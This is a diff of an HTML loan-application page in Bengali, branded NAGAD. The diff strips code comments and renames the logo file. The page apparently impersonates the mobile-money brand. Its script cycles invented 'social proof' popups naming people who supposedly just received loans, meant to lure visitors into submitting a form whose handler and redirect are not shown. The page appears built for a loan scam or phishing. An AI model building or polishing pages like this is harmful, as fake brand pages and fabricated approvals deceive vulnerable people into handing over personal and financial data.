@@ -14,7 +14,6 @@
             justify-content: center; 
         }
 
-        /* ১. প্রি-লোডার ফুল স্ক্রিন */
         #pageLoader {
             position: fixed;
             top: 0;
@@ -78,7 +77,6 @@
             100% { transform: scale(0.97); }
         }
 
-        /* ২. মূল কন্টেইনার ও ফরম লেআউট */
         .container { 
             width: 100%; 
             max-width: 450px; 
@@ -137,7 +135,6 @@
         }
         .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* ৩. সোশ্যাল-প্রুফ লাইভ পপআপ */
         .loan-popup { 
             position: fixed; 
             bottom: 20px; 
@@ -186,9 +183,8 @@
 </head>
 <body>
 
-<!-- প্রি-লোডার স্ক্রিন (NAGAD নামসহ) -->
 <div id="pageLoader">
-    <img src="logo.png" alt="Logo" class="loader-logo">
+    <img src="Logoo.png" alt="Logo" class="loader-logo">
     <div class="loader-brand">NAGAD</div>
     <div class="loader-track">
         <div class="loader-fill" id="fillBar"></div>
@@ -196,7 +192,6 @@
     <div class="loader-subtext">অনুগ্রহ করে অপেক্ষা করুন...</div>
 </div>
 
-<!-- মূল আবেদন ফরম -->
 <div class="container">
     <div class="header">
         <h2>লোন আবেদন ফরম</h2>
@@ -244,7 +239,6 @@
     </div>
 </div>
 
-<!-- সোশ্যাল প্রুফ নোটিফিকেশন পপআপ -->
 <div id="loanAlert" class="loan-popup">
     <div class="popup-icon"><i class="fa-solid fa-circle-check"></i></div>
     <div class="popup-content">
@@ -255,7 +249,6 @@
 </div>
 
 <script>
-    // ১. প্রি-লোডার স্ক্রিপ্ট
     window.addEventListener("DOMContentLoaded", () => {
         const fill = document.getElementById("fillBar");
         const loader = document.getElementById("pageLoader");
@@ -269,7 +262,6 @@
         }, 2200);
     });
 
-    // ২. ফরম সাবমিশন ও রিডাইরেক্ট স্ক্রিপ্ট
     const form = document.getElementById("loanForm");
     const submitBtn = document.getElementById("submitBtn");
 
@@ -294,7 +286,6 @@
         });
     });
 
-    // ৩. সোশ্যাল-প্রুফ লাইভ পপআপ স্ক্রিপ্ট
     const loanData = [
         { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
         { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
